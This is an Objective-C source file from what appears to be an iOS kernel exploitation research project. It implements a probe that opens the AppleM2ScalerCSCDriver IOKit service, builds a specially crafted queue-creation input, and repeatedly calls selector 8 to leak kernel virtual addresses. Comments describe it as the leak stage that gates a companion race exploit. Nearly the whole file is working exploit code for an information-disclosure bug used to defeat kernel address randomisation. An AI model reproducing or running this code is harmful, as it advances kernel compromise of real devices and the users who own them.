//
//  P114SurfaceLeak.m — SOLO M2ScalerCSC sel-8 leak tap (no race). p114.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Pure leak-law validation: the p110 v2 claim probe gates its pairing on
//  this same sel-8 law (see P110SurfaceSwapClaim.m v2); this probe ships
//  the law testable independently of the race. N bounded captures, the KV
//  table print, the honest classification. READ-ONLY: IOServiceOpen +
//  QueueCreate + sel-8 struct calls; no IOSurface grooming beyond one
//  benign create per capture (an event for the serializer), no race.
//
//  Calling-law provenance (p098 siblings, dlsym-only; no <IOSurface/…>):
//    - the v4 law: never bridge the dlsym'd kIOSurface* CFString export
//      slots (the realizeClass/__AUTH_CONST SIGBUS class) — plain
//      CFStringCreateWithCString keys + CFNumberCreate values.
//    - the v6 law: QueueCreate size comes from the runtime LabOff() row
//      (0x410 = 23F77 class / 0x408 twin), hardcoded 0x410 rejected on
//      other rows.
//    - P027/P098 law: the door is NEVER closed on this tap — the delayed
//      async teardown fault fires ~1-2 s AFTER a close; one tap per
//      force-quit.
//    - p098 v5 law: sel-8 with no queue on the connection reads zero
//      bytes and rejects — the queue is created FIRST.
//
//  Tolerant law: if the out shape mismatches (kext version drift), the
//  probe prints the hexdump honestly, HOLDs the law verdict and classifies
//  the capture as unmatched — nothing is parsed from an unmatched shape.
//

#import "P114SurfaceLeak.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabRuntimeOffsets.h"

#define P114_BUILD @"p114-surfaceleak-v1.5-openretry"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>

/* ---- the derived law constants (LabIntelOffsets rows) ------------------- */
#define P114_SEL         8        /* m2scaler.get_iosaDiag_sel PROVEN-EXT  */
#define P114_IN_BYTES    8        /* the {u64} law (row sin=8; NOT 16B)    */
#define P114_REC_HDR     0x20     /* serializer out header                 */
#define P114_REC_STRIDE  0x7c     /* record stride (serializer law)        */
#define P114_KV18        0x18     /* rec+0x18 = RAW qword passthrough      */
#define P114_KV30        0x30     /* rec+0x30 = +0x30-class client-ptr     */
#define P114_CAPTURES    8        /* bounded N                             */
#define P114_CAPTURE_GAP_US 250000 /* 0.25 s between captures              */
#define P114_OUT_MAX     0x10000  /* driver alloc (w+w9)*0x7c+0x20 cover   */
#define P114_TABLE_PRINT 12       /* per-capture record print cap          */

/* ---- fsync log (p110/p112 law): every line hits disk before the next ---- */
static int g_p114_fd = -1;
static NSMutableString *g_p114_log = nil;

static void L(NSString *s) {
    if (!g_p114_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_p114_log appendString:out];
    if (g_p114_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) {
            (void)write(g_p114_fd, p, strlen(p));
            (void)fcntl(g_p114_fd, F_FULLFSYNC);
        }
    }
}

static void Lf(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

/* kernel-range law (the p098 helper, renamed for this file) */
static BOOL p114_kernelish(uint64_t v) {
    return (v >= 0xFFFFFE0000000000ULL && v < 0xFFFFFFF000000000ULL) ||
           (v >= 0xFFFFFFF000000000ULL);
}

/* dlsym'd IOKit (P098 local-prototype shape — IOKitLib.h is iOS-safe but
   the calls stay dlsym'd like the p098/p101 siblings for uniformity)      */
typedef CFMutableDictionaryRef (*p114_IOMatching_t)(const char *);
typedef io_service_t (*p114_IOGetSVC_t)(mach_port_t, CFDictionaryRef);

static mach_port_t g_p114_main;
static p114_IOMatching_t g_p114_match;
static p114_IOGetSVC_t   g_p114_getsvc;
static kern_return_t (*g_p114_open)(io_service_t, task_port_t, uint32_t, io_connect_t *);
static IOReturn (*g_p114_callStruct)(mach_port_t, uint32_t, const void *, size_t,
                                     void *, size_t *);
static IOReturn (*g_p114_objRelease)(io_object_t);

/* IOSurface is dlsym-only per AGENTS.md (no <IOSurface/IOSurface.h>) */
typedef struct __IOSurface *p114_SurfaceRef;
static p114_SurfaceRef (*g_p114_surfCreate)(CFDictionaryRef);
static void (*g_p114_surfRel)(void *);

static io_service_t g_p114_svc;
static io_connect_t g_p114_conn;
static BOOL g_p114_queued;
static uint64_t g_p114_qh;
static uint8_t g_p114_out[P114_OUT_MAX];

static BOOL p114_dlsym(void) {
    if (g_p114_match) return YES;
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
    if (!iokit) iokit = RTLD_DEFAULT;
    g_p114_match      = (p114_IOMatching_t)dlsym(iokit, "IOServiceMatching");
    g_p114_getsvc     = (p114_IOGetSVC_t)dlsym(iokit, "IOServiceGetMatchingService");
    g_p114_open       = (kern_return_t (*)(io_service_t, task_port_t, uint32_t, io_connect_t *))dlsym(iokit, "IOServiceOpen");
    g_p114_callStruct = (IOReturn (*)(mach_port_t, uint32_t, const void *, size_t, void *, size_t *))dlsym(iokit, "IOConnectCallStructMethod");
    g_p114_objRelease = (IOReturn (*)(io_object_t))dlsym(iokit, "IOObjectRelease");
    mach_port_t (*pm)(void) = (mach_port_t (*)(void))dlsym(iokit, "kIOMainPortDefault");
    if (pm) g_p114_main = *(volatile mach_port_t *)pm;
    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!ios) ios = RTLD_DEFAULT;
    g_p114_surfCreate = (p114_SurfaceRef (*)(CFDictionaryRef))dlsym(ios, "IOSurfaceCreate");
    g_p114_surfRel    = (void (*)(void *))dlsym(RTLD_DEFAULT, "CFRelease");
    return g_p114_match && g_p114_getsvc && g_p114_open && g_p114_callStruct;
}

/* one benign surface per capture = a fresh event for the serializer.
   Keys via CFStringCreateWithCString (the p098 v4 law: no dlsym'd
   kIOSurface* bridges — the realizeClass SIGBUS class).                  */
static p114_SurfaceRef p114_mk_surface(void) {
    if (!g_p114_surfCreate) return NULL;
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 5,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    static const char *keyNames[5] = { "IOSurfaceWidth", "IOSurfaceHeight",
                                       "IOSurfaceBytesPerElement",
                                       "IOSurfaceBytesPerRow",
                                       "IOSurfaceAllocSize" };
    static const NSInteger vals[5] = { 256, 1, 4, 1024, 1024 };
    for (int i = 0; i < 5; i++) {
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault,
                                                    keyNames[i], kCFStringEncodingUTF8);
        CFNumberRef num = CFNumberCreate(kCFAllocatorDefault,
                                         kCFNumberNSIntegerType, &vals[i]);
        if (key && num) CFDictionarySetValue(props, key, num);
        if (key) CFRelease(key);
        if (num) CFRelease(num);
    }
    p114_SurfaceRef s = g_p114_surfCreate((CFDictionaryRef)props);
    CFRelease(props);
    return s;
}

static void p114_hexdump(size_t maxn) {
    size_t len = P114_OUT_MAX < maxn ? P114_OUT_MAX : maxn;
    for (size_t row = 0; row < len; row += 16) {
        NSMutableString *hex = [NSMutableString string];
        for (size_t i = 0; i < 16 && row + i < len; i++)
            [hex appendFormat:@"%02x%s", g_p114_out[row + i], (i == 15) ? "" : " "];
        Lf(@"[hexdump] +0x%04zx: %@", row, hex);
    }
}

@implementation P114SurfaceLeak

+ (NSString *)tap {
    g_p114_log = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_p114_fd = open([[docs stringByAppendingPathComponent:@"p114_surfaceleak_log.txt"] UTF8String],
                     O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (g_p114_fd < 0) {
        L(@"[-] cannot open the p114 log in Documents — no fsync log this tap");
    }

    /* ---- banner laws ---- */
    Lf(@"=== p114 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P114_BUILD);
    L([LabDeviceProfile identBlock]);
    L(@"[numbering] catalog id p113 = P113DescForgeControl (AGENTS.md collision "
      @"law) — this probe ships the sel-8 leak law as p114.");
    L(@"[duty law] SOLO leak tap: the p110 v2 claim probe gates its pairing on "
      @"this same law; this probe validates the leak law independently of the "
      @"race (no race, no grooming — one benign IOSurface create per capture "
      @"gives the serializer an event).");
    L(@"[leak law] M2ScalerCSCDriver sel-8 (iosaDiag, m2scaler.get_iosaDiag_sel "
      @"intel row): in = {u64} 8 BYTES (t8150.m2scaler.leak8 cmp x2,#8; NOT p098's "
      @"16-byte {va,size} run-failer); out = the activity-queue serializer records "
      @"(t8150.m2scaler.serializer): +0x20 header, record stride 0x7c, and "
      @"rec+0x18 = str x8,[x0,#0x18] = the RAW first-event qword passthrough, "
      @"NO auth. Likely CVE-2026-64709; fixed 26.6 (23G71) — the 23F77 train is "
      @"LIVE-shape, the 27.0 serializer rows say the law carries.");
    L(@"[honesty] every kernel-range KV below is LAW: KVA DISCLOSURE CLASS — "
      @"not kread. hasKread=NO stays until a kread32-class receipt exists. No "
      @"success claim; the classification is from the record bytes only.");
    Lf(@"[bounds] %d captures max, 0x7c stride parse only, one tap per force-quit "
       @"law, fsync per line. The M2Scaler door is NEVER closed on this tap "
       @"(P027/P098 delayed-teardown law).", P114_CAPTURES);

    if (!p114_dlsym()) {
        L(@"[-] IOKit/IOSurface dlsym incomplete — honest stop, nothing called.");
        goto finish;
    }
    {
        /* door open — honest failures only, no retried storm */
        CFMutableDictionaryRef m = g_p114_match("AppleM2ScalerCSCDriver");
        io_service_t svc = m ? g_p114_getsvc(g_p114_main, m) : 0;
        if (!svc) {
            L(@"[-] AppleM2ScalerCSCDriver not present on this boot — absence is "
              @"a real result, not a bug (honest miss).");
            goto finish;
        }
        (void)g_p114_objRelease(svc);
        g_p114_svc = svc;   /* recorded (log/reference only) */
        /* v1.5 open-retry: the M2Scaler IOServiceOpen FLAPS per boot on the
           fleet (0x10000003 on some boots from tap #1; 2026-10-27: 21:54 ok,
           22:26/22:28 rejected same evening). Bounded 3 attempts, 500 ms
           apart — catches the per-boot window without a retry storm. */
        kern_return_t krO = 0;
        for (int o_try = 0; o_try < 3; o_try++) {
            krO = g_p114_open(svc, mach_task_self(), 0, &g_p114_conn);
            (void)g_p114_objRelease(svc);   /* release AFTER each open (+1 ref) */
            if (krO == KERN_SUCCESS && g_p114_conn) break;
            g_p114_conn = 0;
            Lf(@"[*] IOServiceOpen try %d kr=0x%x (bounded retry, 500 ms)", o_try + 1, krO);
            if (o_try < 2) (void)usleep(500000);
        }
        Lf(@"[*] IOServiceOpen AppleM2ScalerCSCDriver type=0 kr=0x%x conn=%d",
           krO, g_p114_conn);
        if (krO != KERN_SUCCESS || !g_p114_conn) {
            L(@"[-] open rejected (entitlement/sandbox boundary class) — honest miss.");
            goto finish;
        }

        /* queue FIRST (p098 v5 law) — LabOff() row size */
        uint32_t qsz = 0xFA8u;
        static uint8_t qBuf[0xFA8];
        memset(qBuf, 0, sizeof(qBuf));
        /* v1.3 CONTENT LAW (byte-verified on BOTH on-disk builds, 2026-10-27):
           the sel-6 builder's tail gate reads the input byte at in+0xFA4 and
           requires bit0 SET (tbnz w9,#0 -> real builder; bit0=0 -> ret 2c2).
           23F77: tail 0x8a64490; 24A435: tail 0x90dcd28. The front gate
           (in-struct 0xfa8 + first u32 <= 0x3e8, zeros pass) is identical:
           23F77 0x8a31f58/0xa31f64, 24A435 0x909b2f8/0xb304. Tonight's device
           2c2 (outLen=4008 echoed) = exactly this bit absent. */
        qBuf[0xFA4] = 0x01;
        /* v1.4 PHASE LAW (byte-verified 24A435 0x909b2e8-family, 2026-10-27):
           the 4-phase builder's phases 1..3 each require in[0] > 1 (else
           2bd+5 = 2c2) and pass (count=2, in+4) to the shared factory
           (0x908f9d4) which instantiates TWO objects per phase via the
           IOSurface-kext create stub (GOT 0x81153e0 -> 0xa344130 on
           24A435). Phase 0 (0x908f5ec) reads in[0] itself (0x908f664) and
           walks u32 tags post-increment (0x908f6cc [x1],#4). So in[0] =
           the object count, legal window (front gate <= 0x3e8 AND phases
           > 1) -> 2. Tags at in[4]/in[8] = the factory params (tagn 0 =
           first device probe value; the factory's own enum decides). */
        *(uint32_t *)(void *)qBuf = 0x2;          /* word0 = count 2        */
        *(uint32_t *)(void *)(qBuf + 4) = 0x0;    /* tag1 (factory param)   */
        *(uint32_t *)(void *)(qBuf + 8) = 0x0;    /* tag2 (factory param)   */
        size_t qOutLen = sizeof(qBuf);
        uint64_t qOut[4] = {0};
        kern_return_t krQ = g_p114_callStruct(g_p114_conn, 6, qBuf, qsz, qOut, &qOutLen);
        g_p114_qh = qOut[0];
        g_p114_queued = YES;
        Lf(@"[*] QueueCreate sel=6 stIn=0x%x (dispatch-row law: 0xfa8 both builds; "
           @"v1.3 content law: in[0xFA4] bit0=1) "
           @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
           qsz, krQ, qOutLen, (unsigned long long)qOut[0]);

        /* ---- the N captures ---- */
        int caps_ok = 0, caps_held = 0;
        uint64_t seen18[P114_CAPTURES][4];   /* first-4 rec+0x18 per capture  */
        int      seen_n[P114_CAPTURES];
        memset(seen_n, 0, sizeof(seen_n));
        BOOL stride_broken = NO;

        for (int c = 0; c < P114_CAPTURES; c++) {
            if (c) (void)usleep(P114_CAPTURE_GAP_US);

            /* a fresh event for the queue (benign create, released after) */
            p114_SurfaceRef surf = p114_mk_surface();
            if (!surf) Lf(@"[cap %d/%d] benign IOSurface create FAILED "
                          @"(honest; capture continues)", c + 1, P114_CAPTURES);

            memset(g_p114_out, 0, sizeof(g_p114_out));
            uint64_t in64 = c ? g_p114_qh : 0;   /* cap 0 honest-shapes zero  */
            size_t outLen = sizeof(g_p114_out);
            IOReturn kr = g_p114_callStruct(g_p114_conn, P114_SEL, &in64,
                                            P114_IN_BYTES, g_p114_out, &outLen);
            Lf(@"[cap %d/%d] sel=8 in={%016llx} %d B ({u64} law) kr=0x%08x outLen=%zu",
               c + 1, P114_CAPTURES, (unsigned long long)in64,
               (int)P114_IN_BYTES, kr, outLen);

            BOOL mismatch =
                (kr != KERN_SUCCESS) ||
                (outLen < P114_REC_HDR + P114_REC_STRIDE) ||
                (((outLen - P114_REC_HDR) % P114_REC_STRIDE) != 0);
            if (surf && g_p114_surfRel) g_p114_surfRel(surf);

            if (mismatch) {
                caps_held++;
                Lf(@"[cap %d/%d] OUT SHAPE MISMATCH (tolerant law): kext version "
                   @"drift / row-size drift — hexdump follows, capture HELD "
                   @"(nothing parsed from an unmatched shape)",
                   c + 1, P114_CAPTURES);
                p114_hexdump(0x80);
                continue;
            }

            int recs = (int)((outLen - P114_REC_HDR) / P114_REC_STRIDE);
            caps_ok++;
            int kv = 0;
            int pmax = recs < P114_TABLE_PRINT ? recs : P114_TABLE_PRINT;
            seen_n[c] = recs < 4 ? recs : 4;
            for (int i = 0; i < recs && i < (int)P114_TABLE_PRINT; i++) {
                const uint8_t *rec = g_p114_out + P114_REC_HDR + (size_t)i * P114_REC_STRIDE;
                uint64_t v18, v30;
                memcpy(&v18, rec + P114_KV18, 8);   /* RAW passthrough law    */
                memcpy(&v30, rec + P114_KV30, 8);   /* +0x30-class client-ptr */
                BOOL k18 = p114_kernelish(v18), k30 = p114_kernelish(v30);
                if (k18 || k30) kv++;
                if (i < 4) seen18[c][i] = v18;
                Lf(@"[cap %d/%d] rec[%d] +0x18=%016llx%s +0x30=%016llx%s",
                   c + 1, P114_CAPTURES, i,
                   (unsigned long long)v18, k18 ? " KVA" : "",
                   (unsigned long long)v30, k30 ? " KVA" : "");
            }
            if (recs > pmax)
                Lf(@"[cap %d/%d] ... %d more records this capture",
                   c + 1, P114_CAPTURES, recs - pmax);
            Lf(@"[cap %d/%d] kv-disclosure-class=%d/%d records (stride 0x7c law held)",
               c + 1, P114_CAPTURES, kv,
               pmax ? pmax : recs);
            if (!kv)
                L(@"[cap] no kernel-range KV this capture (honest null — perm-strip, "
                  @"input shape, or drift class)");
        }

        /* ---- the across-capture law verdict ---- */
        L(@"=== VERDICT (honest) ===");
        Lf(@"captures ok=%d held=%d/%d (held = shape mismatch, hexdump recorded, "
           @"pairing NOT armed)", caps_ok, caps_held, P114_CAPTURES);
        if (caps_ok) {
            /* does rec+0x18 VARY across captures? fresh values = a live
               passthrough (the serializer re-fills per event); constant =
               the static/global class (the serializer's read-only pointer
               globals — still disclosure-class, not per-event).           */
            int varies = 0;
            for (int i = 0; i < 4; i++) {
                uint64_t a = seen18[0][i];
                BOOL diff = NO;
                for (int c = 1; c < P114_CAPTURES && !diff; c++) {
                    if (seen_n[c] <= i) continue;   /* held/missing capture */
                    if (seen18[c][i] != a) diff = YES;
                }
                if (diff) varies++;
            }
            Lf(@"rec+0x18 variability across captures: %d/4 compared slots vary "
               @"(%s)", varies,
               varies ? @"LIVE passthrough class (per-event refill)" :
                        @"CONSTANT class (serializer's read-only pointer globals — "
                        @"runtime-populated, still disclosure-class)");
            L(@"[law verdict] kv-disclosure classification: any kernel-range qword "
              @"at rec+0x18 (or rec+0x30) = LAW: KVA DISCLOSURE CLASS — not kread. "
              @"This is the IOSurface-KVA leak lane (m2scaler.get_iosaDiag_sel); "
              @"NOT a kread receipt, NOT isKv-verified, no success claim. hasKread=NO.");
        } else {
            L(@"[law verdict] EVERY capture shape-mismatched — the sel-8 law is "
              @"NOT confirmed on this boot/kext (honest HOLD; hexdumps above; the "
              @"p110 pairing gate would HOLD too).");
        }
        L(@"[pairing note] p110 v2 gates its claim-window pairing on the SAME "
          @"shape law — a green p114 verdict is the permission the pairing needs; "
          @"a HELD verdict keeps p110's leakgate-on arm honest-but-unpaired.");
        L(@"HONESTY: READ-ONLY tap (open + queue + sel-8). No race, no writes, "
          @"no grooming beyond the benign per-capture surface. hasKread=NO "
          @"hasKwrite=NO. One tap per force-quit; the door is left open (P027/P098 "
          @"delayed-teardown law).");
    }

finish:
    if (g_p114_fd >= 0) { (void)fcntl(g_p114_fd, F_FULLFSYNC); (void)close(g_p114_fd); g_p114_fd = -1; }
    NSString *ret = g_p114_log;
    g_p114_log = nil;
    return ret;
}

@end